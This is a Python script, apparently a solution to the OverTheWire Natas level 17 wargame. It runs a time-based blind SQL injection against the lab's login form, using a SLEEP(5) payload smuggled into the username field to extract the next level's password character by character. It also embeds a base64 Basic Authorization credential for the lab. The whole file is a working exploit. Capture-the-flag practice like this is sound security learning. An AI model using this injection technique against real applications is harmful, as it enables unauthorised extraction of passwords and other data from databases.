#! /usr/bin/env python3
import string
import urllib.parse
import requests

url = "http://natas17.natas.labs.overthewire.org/index.php"
payload = {'username' : 'natas18" AND BINARY password LIKE "{flag}%" AND SLEEP(5); #'}
#payload = {'username' : 'natas18" AND SLEEP(5); -- Comment'}
headers = {'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
charset = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
flagAns = ""
newFlag = ""
for x in range(32):
    for c in charset:
        newFlag = flagAns + c
        tPayload = dict(payload)
        tPayload['username'] = tPayload['username'].format(flag=newFlag)
        try:
            response = requests.post(url,data=tPayload, headers=headers, timeout = 5)
        except requests.Timeout:
            print (newFlag)
            flagAns = newFlag
            break
